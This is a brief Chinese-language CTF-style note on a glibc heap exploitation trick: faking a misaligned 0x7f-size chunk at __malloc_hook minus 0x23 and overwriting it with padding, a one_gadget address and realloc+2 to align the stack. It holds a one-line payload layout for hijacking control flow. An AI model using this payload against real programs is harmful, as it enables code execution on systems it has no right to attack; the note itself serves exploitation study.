---
author: YelloChunk
tags: Misc
---
# Malloc_Hook 错位构造 0x7f Size Chunk

# Tricks：

```
打Malloc_Hook  - 0x23        选择 “\x00” * 0xB + p64(OneGadGet) + p64(Realloc+0x2)
Realloc + 2 错位 POP 帮助我们拿下
```

